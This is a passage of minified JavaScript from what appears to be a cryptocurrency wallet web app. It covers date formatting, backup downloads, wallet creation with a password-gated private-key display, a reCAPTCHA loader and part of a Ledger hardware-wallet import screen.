                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : ""
                  , t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 2;
                for (; String(e).length < t; )
                    e = `0${e}`;
                return e
            };
            return function(n, r) {
                let l = !(arguments.length > 2 && void 0 !== arguments[2]) || arguments[2];
                const s = date_format_dateFormat;
                "transactions" === r && (l = !1);
                const i = new Date(n);
                "UTC:" === (r = String(bm[r] || r || bm.default)).slice(0, 4) && (r = r.slice(4));
                const o = l ? "getUTC" : "get"
                  , c = i[`${o}Date`]()
                  , u = i[`${o}Day`]()
                  , d = i[`${o}Month`]()
                  , m = i[`${o}FullYear`]()
                  , p = i[`${o}Hours`]()
                  , f = i[`${o}Minutes`]()
                  , E = i[`${o}Seconds`]()
                  , h = i[`${o}Milliseconds`]()
                  , g = l ? 0 : i.getTimezoneOffset()
                  , y = {
                    d: c,
                    dd: pad(c),
                    ddd: s.i18n.dayNames[u],
                    dddd: s.i18n.dayNames[u + 7],
                    m: d + 1,
                    mm: pad(d + 1),
                    mmm: s.i18n.monthNames[d],
                    mmmm: s.i18n.monthNames[d + 12],
                    yy: String(m).slice(2),
                    yyyy: m,
                    h: p % 12 || 12,
                    hh: pad(p % 12 || 12),
                    H: p,
                    HH: pad(p),
                    M: f,
                    MM: pad(f),
                    s: E,
                    ss: pad(E),
                    l: pad(h, 3),
                    L: pad(h > 99 ? Math.round(h / 10) : h),
                    t: p < 12 ? "a" : "p",
                    tt: p < 12 ? "am" : "pm",
                    T: p < 12 ? "A" : "P",
                    TT: p < 12 ? "AM" : "PM",
                    Z: l ? "UTC" : (String(i).match(t) || [""]).pop().replace(a, ""),
                    o: (g > 0 ? "-" : "+") + pad(Math.floor(Math.abs(g) / 60 * 100) + Math.abs(g) % 60, 4),
                    S: ["th", "st", "nd", "rd"][c % 10 > 3 ? 0 : (c % 100 - c % 10 != 10) * c % 10]
                };
                return r.replace(e, (e => e in y ? y[e] : e.slice(1, e.length - 1)))
            }
        }
        ;
        date_format_dateFormat.i18n = {
            dayNames: ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"],
            monthNames: ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec", "January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
        };
        const date_format = (e, t) => date_format_dateFormat()(e, t, !1)
          , km = ".txt";
        function downloadFile(e, t) {
            const a = date_format(new Date, "yyyy-mm-dd-HH-MM")
              , [n,r,l,s,i] = a.split("-")
              , o = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;
            t && -1 === t.indexOf(km) && (t += km);
            t && (t = t.replace(":dd", l).replace(":mm", r).replace(":yy", n).replace(":hh", s).replace(":MM", i));
            t || (t = `${date_format(new Date, a)}-guarda-backup.txt`);
            const c = document.createElement("a")
              , u = new Blob([e],{
                type: "octet/stream"
            })
              , d = window.URL.createObjectURL(u);
            c.setAttribute("href", d);
            c.setAttribute("download", t);
            o && c.setAttribute("target", "_blank");
            c.style.display = "none";
            document.body.appendChild(c);
            c.click();
            document.body.removeChild(c)
        }
        let Sm;
        !function(e) {
            e[e.FORCE = -1] = "FORCE";
            e[e.AFTER_CREATE_WALLET = 2] = "AFTER_CREATE_WALLET";
            e[e.AFTER_IMPORT_BACKUP = 8] = "AFTER_IMPORT_BACKUP";
            e[e.AFTER_CHANGE_PASSWORD = 16] = "AFTER_CHANGE_PASSWORD";
            e[e.BEFORE_REMOVE_WALLET = 32] = "BEFORE_REMOVE_WALLET"
        }(Sm || (Sm = {}));
        const Cm = ["backupFilename"]
          , Nm = "autobackup"
          , Tm = {}
          , Am = (0,
        te.createReducer)(Tm).handleAction(wm, ( (e, t) => {
            let {payload: {backupFilename: a}} = t;
            return {
                ...e,
                backupFilename: a
            }
        }
        ))
          , autobackuoSettiingsStateSelector = e => e[Nm]
          , xm = (0,
        _t.P1)(autobackuoSettiingsStateSelector, (e => {
            let {backupFilename: t=""} = e;
            return t
        }
        ))
          , updateSetting = e => t => {
            t(setSecureData(Ze, e))
        }
          , setFilenameBackupToStore = e => t => {
            t(wm({
                backupFilename: e
            }))
        }
          , getSetting = () => async e => {
            const t = undefined;
            return await e(getSecureData(Ze)) || 0
        }
          , hasSetting = e => async t => {
            const a = undefined;
            return (await t(getSetting()) & e) > 0
        }
          , handleDownload = e => async (t, a) => {
            const n = a()
              , r = (0,
            oe.gX)(n)
              , l = xm(n);
            t(ie.saveBackup());
            if (e === Sm.FORCE) {
                downloadFile(r, l);
                return !0
            }
            const s = undefined;
            if ((await t(getSetting()) & e) > 0) {
                downloadFile(r, l);
                return !0
            }
            return !1
        }
        ;
        function usePopup() {
            const e = undefined;
            return {
                open: (0,
                O.useContext)(Vt).open,
                onAfterCreateWallet(e) {
                    e.persistorFlushFailedFatally && this.open("import-or-create", {
                        withoutMenu: !0,
                        initialUnclosable: !0,
                        initialTab: "create",
                        initialState: lp.CREATED,
                        initialWalletModel: e.walletModel,
                        initialShouldForceBackupDownload: !0
                    })
                }
            }
        }
        const Im = "loader-dots_loading_1sH8F"
          , Pm = "loader-dots_dots_2NIDd"
          , Lm = "loader-dots_dotsDarkTheme_irT7M";
        function LoaderDots(e) {
            let {visible: t} = e;
            return t ? O.createElement("span", {
                className: Im
            }) : null
        }
        LoaderDots.propTypes = {
            visible: as().bool
        };
        const Fm = "popup-import-xmr_popupWrapper_2pQRl"
          , Wm = "popup-import-xmr_imgWrapper_ttCqR"
          , Rm = "popup-import-xmr_center_2QVLi"
          , Bm = "popup-import-xmr_horizontalBlocks_qohcS"
          , Om = "popup-import-xmr_captchaBlock_nmhW2"
          , Dm = "popup-import-xmr_wrapperLoader_32rnR"
          , loadScript = e => new Promise(( (t, a) => {
            const n = document.createElement("script");
            n.src = e;
            n.onload = t;
            n.onerror = a;
            document.head.appendChild(n)
        }
        ))
          , CaptchaCode = e => {
            const t = (0,
            $.v9)(Ot)
              , [a,n] = (0,
            O.useState)(!0)
              , handleCaptchaCode = t => {
                n(!1);
                e.onCaptcha(t)
            }
            ;
            (0,
            O.useEffect)(( () => {
                window.handleRecaptchaOnload = () => {
                    window.grecaptcha.render("g-recaptcha", {
                        sitekey: "6LezYI0hAAAAAJoka4ENKgQ001CIvxYRSabJAqg4",
                        theme: t,
                        callback: handleCaptchaCode,
                        "expired-callback": () => handleCaptchaCode("")
                    });
                    n(!1)
                }
                ;
                loadScript("https://www.google.com/recaptcha/api.js?onload=handleRecaptchaOnload")
            }
            ), []);
            return O.createElement("div", null, a && O.createElement("div", {
                className: Dm
            }, O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("div", {
                className: Om,
                id: "g-recaptcha",
                style: {
                    display: a ? "none" : ""
                }
            }))
        }
          , Mm = CaptchaCode
          , Um = "data-recording-alert_alertDanger_1uASs"
          , Gm = "data-recording-alert_footerButtonStatus_up_Ba app_footerButtonStatus_1lnBU"
          , Vm = "data-recording-alert_footerButtonStatusCenter_1PVvo";
        function DataRecordingAlert(e) {
            let {onDownloadBackupClick: t} = e;
            return O.createElement(O.Fragment, null, O.createElement("div", {
                className: Um
            }, O.createElement("p", null, "Data recording error. We already know about the issue and are sorting it out."), O.createElement("p", null, "Meanwhile, please download your backup to ensure the safety of your funds.", " ", O.createElement("a", {
                href: "https://support.guarda.com/troubleshooting/data-recording-error",
                target: "_blank",
                rel: "noopener noreferrer"
            }, "Read more"))), O.createElement("div", {
                className: Vm
            }, O.createElement(Yl, {
                color: "red",
                onClick: t
            }, "Download backup")))
        }
        const Km = "PopupCreateWallet_fastCreateBlock_V47rr"
          , Hm = "PopupCreateWallet_horizontalBlocks_3LpoZ"
          , zm = "PopupCreateWallet_fastCreateItem_3kJQt"
          , jm = "PopupCreateWallet_fastCreateTicker_37g0i"
          , $m = "PopupCreateWallet_orSeparator_H8w7p"
          , Zm = "PopupCreateWallet_footerButtonStatus_3a29u app_footerButtonStatus_1lnBU"
          , Ym = "PopupCreateWallet_footerButtonStatusCenter_vYvBw"
          , qm = "PopupCreateWallet_lineInformation_3yH0u"
          , Xm = "PopupCreateWallet_wrapperCreatedWallet_2QDtF"
          , Qm = "PopupCreateWallet_wrapperSkipedWallet_289RX"
          , Jm = "PopupCreateWallet_inputPassword_1kmw8"
          , ep = "PopupCreateWallet_linePassword_OQFxb"
          , tp = "PopupCreateWallet_passwordError_24r9d"
          , ap = "PopupCreateWallet_backButton_24vFK"
          , np = "PopupCreateWallet_popupWrapper_3E9qU"
          , rp = "PopupCreateWallet_loadingWrapper_2991D";
        let lp;
        !function(e) {
            e.INITIAL = "state/initial";
            e.CREATED = "state/created";
            e.SKIP = "state/skip"
        }(lp || (lp = {}));
        const sp = ["hbar"]
          , ip = ["btc", "eth", "xrp", "ton"]
          , WalletPrivateKey = e => {
            let {privateKey: t} = e;
            return "string" == typeof t ? O.createElement("div", {
                className: qm
            }, O.createElement("h4", null, "Private Key:"), O.createElement("span", null, t)) : "object" == typeof t ? O.createElement(O.Fragment, null, Object.entries(t).map((e => {
                let[t,a] = e;
                return O.createElement("div", {
                    key: t,
                    className: qm
                }, O.createElement("h4", null, t, ":"), O.createElement("span", null, a))
            }
            ))) : null
        }
          , PopupCreateWallet = e => {
            var t, a, n, r, l, s;
            const [i,o] = (0,
            O.useState)(null !== (t = e.initialState) && void 0 !== t ? t : lp.INITIAL)
              , [c,u] = (0,
            O.useState)(null !== (a = e.initialShouldForceBackupDownload) && void 0 !== a && a)
              , [d,m] = (0,
            O.useState)(e.initialWalletModel)
              , [p,f] = (0,
            O.useState)(!1)
              , [E,h] = (0,
            O.useState)(d ? {
                ticker: null == d || null === (n = d.data) || void 0 === n ? void 0 : n.ticker,
                smartContract: null == d || null === (r = d.data) || void 0 === r ? void 0 : r.smartContract,
                title: null == d || null === (l = d.data) || void 0 === l ? void 0 : l.title,
                family: null == d || null === (s = d.data) || void 0 === s ? void 0 : s.family
            } : null)
              , [g,y] = (0,
            O.useState)(null == d ? void 0 : d.currency)
              , [v,_] = (0,
            O.useState)("")
              , [w,b] = (0,
            O.useState)(!1)
              , [k,S] = (0,
            O.useState)(!1)
              , [C,N] = (0,
            O.useState)(!1)
              , [T,A] = (0,
            O.useState)(null)
              , [x,I] = (0,
            O.useState)("")
              , P = (0,
            O.useRef)(null)
              , L = (0,
            $.I0)()
              , F = usePopup()
              , W = (0,
            $.v9)(su)
              , R = (0,
            $.v9)(iu);
            (0,
            O.useEffect)(( () => {
                if (R) {
                    I(R);
                    f(!1)
                }
            }
            ), [R]);
            (0,
            O.useEffect)(( () => {
                if (W) {
                    F.onAfterCreateWallet({
                        walletModel: W,
                        backupDownloaded: !1,
                        persistorFlushFailedFatally: !1
                    });
                    cc.$.send(cc.d.WALLET_CREATE_SINGLE, W.currency);
                    m(W);
                    e.onChangeUnclosable(!0);
                    u(!1);
                    o(lp.CREATED);
                    f(!1)
                }
            }
            ), [W]);
            const B = (0,
            O.useCallback)((async (e, t) => {
                if (void 0 === e || void 0 === e.ticker)
                    throw "Currency is not valid for creation";
                if ("eos" !== e.ticker) {
                    y(e.ticker);
                    f(!0);
                    void 0 !== e.family && null !== e.family ? L(rd.createWallet({
                        currency: e.ticker,
                        smartContract: e.smartContract,
                        isCoin: !1,
                        captchaCode: t,
                        parentWallet: (0,
                        be.II)(e.family)
                    })) : L(rd.createWallet({
                        currency: e.ticker,
                        isCoin: !0,
                        captchaCode: t
                    }))
                } else
                    F.open("create-eos")
            }
            ), [L, F, e])
              , checkPassword = e => {
                var t;
                const a = undefined;
                if (L(checkMasterPassword(v)))
                    e();
                else {
                    _("");
                    null === (t = P.current) || void 0 === t || t.focus();
                    b(!0);
                    setTimeout(( () => b(!1)), 3e3)
                }
            }
              , handleCheckShowPassword = () => {
                checkPassword(( () => S(!0)))
            }
              , handleCheckSkipPassword = () => {
                checkPassword(( () => {
                    var t;
                    L(ie.saveBackup());
                    e.onChangeUnclosable(!1);
                    e.onClose();
                    null === (t = e.onAfterClose) || void 0 === t || t.call(e);
                    L(rd.setNewCreatedWalletId({
                        walletId: null
                    }))
                }
                ))
            }
              , handleBackSkiping = () => {
                o(lp.CREATED)
            }
              , skipDownload = async () => {
                var t;
                L(ie.saveBackup());
                const a = undefined;
                if (await L(hasSetting(Sm.AFTER_CREATE_WALLET)))
                    o(lp.SKIP);
                else {
                    e.onChangeUnclosable(!1);
                    e.onClose();
                    null === (t = e.onAfterClose) || void 0 === t || t.call(e)
                }
            }
              , forceDownload = async () => {
                var t;
                await L(handleDownload(Sm.FORCE));
                L(removeNotifyBackup());
                e.onChangeUnclosable(!1);
                e.onClose();
                null === (t = e.onAfterClose) || void 0 === t || t.call(e);
                L(rd.setNewCreatedWalletId({
                    walletId: null
                }))
            }
            ;
            (0,
            O.useEffect)(( () => () => e.onChangeUnclosable(!1)), [e]);
            (0,
            O.useEffect)(( () => {
                e.currency && h(e.currency)
            }
            ), [e.currency]);
            const isNeedCaptcha = () => {
                var e;
                return sp.includes(null !== (e = null == E ? void 0 : E.ticker) && void 0 !== e ? e : "")
            }
            ;
            (0,
            O.useEffect)(( () => {
                e.isForceCreate && null !== E && B(E, T || void 0)
            }
            ), [e.isForceCreate, E]);
            (0,
            O.useEffect)(( () => {
                x && setTimeout(( () => {
                    I(null)
                }
                ), 3e3)
            }
            ), [x]);
            if (i === lp.SKIP)
                return O.createElement("div", {
                    className: Qm
                }, O.createElement("h2", null, "Confirm skipping backup download"), O.createElement("p", null, "We strongly recommend ALWAYS allowing backup download.It ensures that you never lose your wallet after logout.", O.createElement("br", null), O.createElement("br", null), "If you are skipping backup download after creating the wallet, please remember to download The updated backup file before logout.Updated backup is marked by red point in the menu on the top."), O.createElement("div", {
                    className: qm
                }, O.createElement("div", {
                    className: ep
                }, O.createElement(Ea, {
                    ref: P,
                    autoFocus: !0,
                    type: "password",
                    placeholder: "Password",
                    value: v,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return _(t)
                    }
                    ,
                    className: Jm,
                    onEnter: handleCheckSkipPassword
                }), O.createElement(Yl, {
                    color: "red",
                    onClick: handleCheckSkipPassword
                }, "Skip download")), w && O.createElement("div", {
                    className: tp
                }, "Wrong password. Please try again")), O.createElement("div", {
                    className: ap,
                    onClick: handleBackSkiping
                }, "Back"));
            if (i === lp.CREATED && d) {
                var D;
                return O.createElement("div", {
                    className: Xm
                }, O.createElement("h2", {
                    id: "addWalletCurrencyTitle"
                }, null === (D = (0,
                be.II)(null != g ? g : void 0)) || void 0 === D ? void 0 : D.title, " wallet has been created"), O.createElement("p", {
                    className: "textCenter"
                }, e.successTitle || "Kindly find it highlighted in the menu on the left along with the other Guarda wallets."), O.createElement("div", {
                    className: qm
                }, O.createElement("h4", null, "Address:"), O.createElement("span", null, d.address)), k && O.createElement("div", null, O.createElement(WalletPrivateKey, {
                    privateKey: d.privateKey
                })), !k && O.createElement("div", {
                    className: qm
                }, !C && O.createElement("div", {
                    className: qm
                }, O.createElement("span", null, O.createElement("span", {
                    className: "dashedNormal",
                    onClick: () => N(!0)
                }, "Show private Key"))), C && O.createElement("div", {
                    className: "relative"
                }, O.createElement("div", {
                    className: ep
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    type: "password",
                    placeholder: "Password",
                    value: v,
                    onChange: e => {
                        let {target: {value: t}} = e;
                        return _(t)
                    }
                    ,
                    className: Jm,
                    onEnter: handleCheckShowPassword
                }), O.createElement(Yl, {
                    color: "blue",
                    onClick: handleCheckShowPassword
                }, "Show")), w && O.createElement("div", {
                    className: tp
                }, "Wrong password. Please try again"))), c ? O.createElement(DataRecordingAlert, {
                    onDownloadBackupClick: forceDownload
                }) : O.createElement("div", {
                    className: Ym
                }, O.createElement(Yl, {
                    color: "blue",
                    onClick: forceDownload,
                    id: "addWalletDownloadBackup"
                }, "Download backup"), O.createElement("br", null), O.createElement(Yl, {
                    color: "simple",
                    onClick: skipDownload,
                    id: "addWalletSkip"
                }, "Skip download")))
            }
            return i === lp.INITIAL ? O.createElement(O.Fragment, null, O.createElement("p", null, "Creating a new wallet is very simple now. Just choose one of the following popular currencies:"), O.createElement(_m, {
                currency: null == E ? void 0 : E.ticker,
                type: nm
            }), O.createElement("div", {
                className: Km
            }, ip.map((e => {
                var t;
                return O.createElement("div", {
                    onClick: () => {
                        var t;
                        return B(null !== (t = (0,
                        be.II)(e)) && void 0 !== t ? t : void 0)
                    }
                    ,
                    className: zm,
                    key: `fastcreate${e}`
                }, O.createElement(IconCurrency, {
                    currency: e,
                    className: jm
                }), O.createElement("div", null, null === (t = (0,
                be.II)(e)) || void 0 === t ? void 0 : t.title))
            }
            ))), O.createElement("div", {
                className: $m
            }, O.createElement("span", null, "Or")), O.createElement(Vd, {
                onChange: h,
                isWithTokens: !0,
                selectedCurrency: e.currency ? e.currency : null != E ? E : void 0,
                currencies: Se.Z.getTickersByCoinAdapterFeatures((e => e.isActiveCreate))
            }), x && O.createElement("div", null, O.createElement(ui_message, {
                type: "error"
            }, x)), isNeedCaptcha() && O.createElement("div", {
                className: Hm
            }, O.createElement(Mm, {
                onCaptcha: A
            })), O.createElement("div", {
                className: Zm
            }, O.createElement("div", null), O.createElement(Yl, {
                disabled: null === E || isNeedCaptcha() && !T,
                onClick: () => null !== E && B(E, T || void 0),
                color: "blue",
                size: "big",
                isLoading: p,
                loaderBlueInLightTheme: !0,
                id: "addWalletCreateButton"
            }, "Create"))) : null
        }
          , op = "checkbox_wrapper_1QgLe"
          , cp = "checkbox_invalid_1GpCm"
          , up = "checkbox_gray_BARSK";
        function checkbox_extends() {
            checkbox_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return checkbox_extends.apply(this, arguments)
        }
        const dp = O.forwardRef(( (e, t) => {
            let {className: a, children: n, isInvalid: r, isGray: l, ...s} = e;
            return O.createElement("label", {
                className: Ht()(op, a, {
                    [cp]: r
                }, {
                    [up]: l
                })
            }, O.createElement("input", checkbox_extends({
                ref: t,
                type: "checkbox"
            }, s)), O.createElement("span", null), O.createElement("div", null, n))
        }
        ))
          , mp = dp;
        function formatAddress(e, t) {
            if (!e)
                return "";
            if ("segwit" === e)
                return "SegWit address";
            if ("coinbase" === e)
                return "Coinbase";
            if ("invalidaddress" === e)
                return "Unparsed address";
            const a = t || 5
              , n = t || 3;
            return a + n >= e.length ? e : `${String(e).slice(0, a)}...${String(e).slice(-n)}`
        }
        const pp = /[&<>)("'`\\/*.=?+:\[\]]/g
          , fp = {
            "&": " ",
            "<": " ",
            ">": " ",
            '"': " ",
            "'": " ",
            "/": " ",
            "(": " ",
            ")": " ",
            "*": " ",
            ".": " ",
            "=": " ",
            "`": " ",
            "?": " ",
            ":": " ",
            "+": " ",
            "\\": " ",
            "[": " ",
            "]": " "
        }
          , escape_search = e => `${e}`.replace(pp, (e => fp[e]))
          , Ep = "select_wrapper_royND inputs_wrapper_2IV3F"
          , hp = "select_inputWrapper_yUluf inputs_inputWrapper_k3xth"
          , gp = "select_isOpen_2SwQU"
          , yp = "select_placeholder_35X6x"
          , vp = "select_item_e37bA"
          , _p = "select_iconArrow_28AAD inputs_iconArrow_2EDQu"
          , wp = "select_wrapperList_3r3GR"
          , bp = "select_currencyBlock_2KzA6 inputs_currencyBlock_2rgQZ"
          , kp = "select_emptyState_2H7sX"
          , Sp = "select_wrapImage_3myrN"
          , Cp = "select_errorWrapper_2YRbi"
          , Np = "select_visibleText_UttJn"
          , Tp = "select_loaderPlaceholder_3-HCM"
          , Ap = "select_searchWrapper_37V3X"
          , xp = "select_searchInput_39bX3";
        function checkStr(e, t) {
            return null !== String(e).match(t)
        }
        const Ip = O.memo((e => {
            let {icon: t, title: a, subtitle: n} = e;
            return O.createElement(O.Fragment, null, t && O.createElement("div", {
                className: Sp
            }, O.createElement("img", {
                src: t,
                alt: a
            })), O.createElement("div", {
                className: vp
            }, O.createElement("span", null, a), n && O.createElement("div", null, n)))
        }
        ))
          , Pp = O.forwardRef(( (e, t) => {
            let {hasSearch: a=!0, externalHandleSearch: n, onChange: r, items: l=[], isLoading: s, selected: i, placeholder: o, emptyPlaceholder: c, maxHeight: u, renderItem: d, inputWrapperClassName: m, arrowClassName: p} = e;
            const [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)("")
              , y = d || Ip
              , handleSelect = e => () => {
                r && r(e);
                E(!1);
                g("")
            }
              , handleOpen = () => {
                if (!s) {
                    g("");
                    E(!f)
                }
            }
              , handleSearch = e => {
                n ? n(e.target.value) : g(e.target.value)
            }
              , v = {
                [yp]: !i,
                [gp]: f
            }
              , _ = new RegExp(escape_search(h),"ig")
              , w = null == l ? void 0 : l.filter((e => !h || checkStr(String(e.title) + String(e.subtitle), _)));
            return O.createElement("div", {
                ref: t,
                className: Ep,
                tabIndex: 0,
                role: "button"
            }, O.createElement("div", {
                className: Ht()(hp, v, m),
                onClick: handleOpen
            }, !s && O.createElement(O.Fragment, null, i ? O.createElement(y, i) : O.createElement("span", null, o)), s && O.createElement(O.Fragment, null, O.createElement("span", {
                className: Tp
            }, "Loading"), " ", O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: Gd()
                },
                className: Ht()(_p, p)
            })), O.createElement(Xl(), {
                visible: f,
                onClose: () => E(!1)
            }, O.createElement("div", {
                className: wp,
                style: {
                    maxHeight: u
                }
            }, a && O.createElement("div", {
                className: Ap
            }, O.createElement("input", {
                onChange: handleSearch,
                autoFocus: !0,
                placeholder: "Search...",
                type: "text",
                className: xp,
                spellCheck: "false",
                autoCorrect: "off",
                autoComplete: "off"
            })), w.map((e => O.createElement("div", {
                className: Ht()(bp),
                onClick: handleSelect(e),
                key: `select-item${e.id || e.title}`
            }, O.createElement(y, e)))), !w.length && O.createElement("div", {
                className: kp
            }, c))))
        }
        ));
        Pp.displayName = "Select";
        Pp.defaultProps = {
            maxHeight: 350,
            isLoading: !1
        };
        const Lp = Pp;
        var Fp = a(3547);
        const Wp = "button-copy_button_C4eji"
          , Rp = undefined
          , button_copy = e => {
            const [t,a] = (0,
            O.useState)(!1)
              , handleClick = () => {
                if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
                    const t = document.createElement("textarea");
                    t.textContent = String(e.text);
                    t.style.position = "fixed";
                    document.body.appendChild(t);
                    t.select();
                    a(!0);
                    setTimeout(( () => a(!1)), 700);
                    e.onClick && e.onClick();
                    try {
                        document.execCommand("copy")
                    } catch (e) {} finally {
                        document.body.removeChild(t)
                    }
                }
            }
              , n = t ? "Copied" : "Copy";
            return O.createElement("div", {
                className: Ht()(e.className, Wp),
                onClick: handleClick
            }, "function" == typeof e.children ? e.children(t) : n)
        }
          , Bp = a.p + "5fd85eb2ba49853de5503b849037e8cf.svg"
          , Op = {
            globalWrapper: "ledger_globalWrapper_k3WKM",
            wrapperAccounts: "ledger_wrapperAccounts_2m1_B",
            back: "ledger_back_L_4Iw",
            stop: "ledger_stop_19QS8",
            wrapperProgress: "ledger_wrapperProgress_gu68w",
            account: "ledger_account_xGfsl",
            accountContainer: "ledger_accountContainer_2czLX",
            accountWrapper: "ledger_accountWrapper_2_I3b",
            subAccountContainer: "ledger_subAccountContainer_2MEKR",
            final: "ledger_final_3OI1Z",
            subAccount: "ledger_subAccount_1iIct",
            info: "ledger_info_1EKYi",
            hdInfo: "ledger_hdInfo_1T-ID",
            addressText: "ledger_addressText_1iAMt",
            derivePath: "ledger_derivePath_1aRWk",
            checkbox: "ledger_checkbox_fs9R4",
            hdIsAdded: "ledger_hdIsAdded_26hT_",
            balance: "ledger_balance_3p6iB",
            subWalletBalance: "ledger_subWalletBalance_1AiTo",
            status: "ledger_status_2vOdT",
            footerButtonStatus: "ledger_footerButtonStatus_3v7_y app_footerButtonStatus_1lnBU",
            advancedOptions: "ledger_advancedOptions_2_qsX",
            wrapperAdvancedOptions: "ledger_wrapperAdvancedOptions_1O5ml",
            sponsoredLink: "ledger_sponsoredLink_2orPT",
            wrapperLedgerImage: "ledger_wrapperLedgerImage_1h9G_",
            jpg: "ledger_jpg_2WCYX",
            stepInfo: "ledger_stepInfo_cyy_r"
        }
          , Dp = {
            eth: [{
                title: "Ledger",
                subtitle: "44'/60'/0'"
            }, {
                title: "TREZOR",
                subtitle: "44'/60'/0'/0"
            }, {
                title: "Metamask",
                subtitle: "44'/60'/0'/0"
            }, {
                title: "Jaxx",
                subtitle: "44'/60'/0'/0"
            }, {
                title: "Exodus",
                subtitle: "44'/60'/0'/0"
            }, {
                title: "imToken",
                subtitle: "44'/60'/0'/0"
            }, {
                id: "custom",
                title: "Custom derive path"
            }],
            etc: [{
                title: "Ledger",
                subtitle: "44'/60'/160720'/0"
            }, {
                title: "Ledger Old",
                subtitle: "44'/60'/160720'/0'/0"
            }, {
                title: "TREZOR",
                subtitle: "44'/61'/0'/0"
            }, {
                id: "custom",
                title: "Custom derive path"
            }],
            clo: [{
                title: "CLO Network",
                subtitle: "44'/820'/0'/0"
            }, {
                id: "custom",
                title: "Custom derive path"
            }],
            btc: [{
                title: "Default",
                subtitle: "49'/0'/0'/0/0"
            }, {
                id: "custom",
                title: "Custom derive path"
            }],
            "btc-testnet": [{
                title: "Default",
                subtitle: "49'/1'/0'/0/0"
            }, {
                id: "custom",
                title: "Custom derive path"
            }],
            ltc: [{
                title: "Default",
                subtitle: "49'/2'/0'/0/0"
            }, {
                id: "custom",
                title: "Custom derive path"
            }]
        }
          , Mp = a.p + "assets/images/3sqlKWV.gif"
          , Up = a.p + "assets/images/1LaiqQn.gif"
          , Gp = a.p + "assets/images/1HZh9Sl.gif"
          , Vp = a.p + "assets/images/2yC1rly.gif"
          , Kp = a.p + "assets/images/3sdBOkd.gif"
          , Hp = a.p + "assets/images/2VQoABD.gif"
          , zp = "await-connect"
          , jp = "progress"
          , $p = "initial"
          , Zp = "view-accounts"
          , Yp = "end-scan"
          , qp = "end-view"
          , Xp = {
            ltc: Mp,
            btc: Up,
            eth: Gp,
            etc: Vp,
            clo: Kp,
            bnb: Hp
        };
        let Qp, Jp, ef;
        (async () => {
            ef = await Fp.Z.isSupported()
        }
        )();
        const PopupImportLedger = e => {
            const [t,a] = (0,
            O.useState)($p)
              , [n,r] = (0,
            O.useState)(!1)
              , [l,s] = (0,
            O.useState)(e.currency ? {
                ticker: e.currency
            } : null)
              , [i,o] = (0,
            O.useState)(ef)
              , [c,u] = (0,
            O.useState)([])
              , [d,m] = (0,
            O.useState)(!1)
              , [p,f] = (0,
            O.useState)(!0)
              , [E,h] = (0,
            O.useState)(null)
              , [g,y] = (0,
            O.useState)(null)
              , [v,_] = (0,
            O.useState)({})
              , [w,b] = (0,
            O.useState)(null)
              , [k,S] = (0,
            O.useState)("")
              , [C,N] = (0,
            O.useState)(null);
            let T = (0,
            O.useRef)(null);
            const A = (0,
            $.v9)(au)
              , x = (0,
            $.I0)()
              , handleRefAccounts = e => {
                e && (T = e)
            }
              , checkLedgerAvability = async () => {
                const e = await Fp.Z.isSupported();
                o(e)
            }
              , showError = e => {
                a($p);
                const t = `Please make sure that Ledger is connected,\n      unblocked and ${l ? l.title : ""} app is selected`;
                S(e || t);
                window.clearTimeout(Qp);
                Qp = window.setTimeout(( () => S("")), 5e3);
                u([]);
                _({})
            }
              , fetchApi = async e => {
                let t = null;
                try {
                    t = await Fp.Z.getApiByCurrency(e);
                    return t
                } catch (a) {
                    if ("TransportOpenUserCancelled" === a.name) {
                        t = fetchApi(e);
                        return t
                    }
                    showError();
                    throw a
                }
            }
              , resetState = () => {
                a($p);
                window.clearTimeout(Qp);
                S("");
                u([]);
                _({});
                s(null);
                N(null);
                window.clearInterval(Jp);
                window.clearTimeout(Qp)
            }
            ;
            (0,
            O.useEffect)(( () => {
                checkLedgerAvability();
                return () => {
                    window.clearInterval(Jp)
                }
            }
            ), []);
            const isNeedToAddEmptyAccount = e => "bnb" === e.currency
              , validateDerivePath = e => {
                const t = e.split("/");
                return !(t.length < 3) && t.every((e => /^\d+'?$/.test(e)))
            }
              , isCheckedAccount = e => !!v[e.address]
              , isDisabledAddButton = () => !!n || 0 === c.filter((e => isCheckedAccount(e))).length
              , addAccount = (e, t) => {
                if (null === l || void 0 === l.ticker)
                    return;
                const a = l.ticker;
                if (!e.isEmpty || t) {
                    const t = A(e.address, a);
                    Object.assign(e, {
                        isAdded: t,
                        num: c.length
                    });
                    t || isNeedToAddEmptyAccount(e) || (v[e.address] = !0);
                    c.push(e);
                    u(c);
                    _({
                        ...v
                    })
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                setTimeout(( () => {
                    T && T.scrollTop && (T.scrollTop += 100)
                }
                ), 50)
            }
            ), [v]);
            const handleChangeDerivePath = e => {
                let {target: {value: t}} = e;
                const a = (t || "").replace(/m/gi, "").trim()
                  , n = validateDerivePath(a);
                y(a);
                f(n)
            }
              , handleChangeCurrency = async e => {
                const t = undefined;
                if (!await Fp.Z.isSupported())
                    return;
                s(e);
                const a = undefined
                  , n = (await fetchApi(e.ticker)).getDefaultDerivePath();
                h(n);
                b(null);
                y(null)
            }
              , hanldeAddNewWallet = async () => {
                r(!0);
                if (null === l || void 0 === l.ticker)
                    return;
                const e = l.ticker
                  , t = await fetchApi(e)
                  , a = c.filter((e => !t.isLegacyPath(e.derivePath)))
                  , n = a.length > 0 ? a[a.length - 1] : null
                  , s = await t.getNextAccount(n);
                addAccount(s, !0);
                r(!1)
            }
              , [I,P] = (0,
            O.useState)(!1)
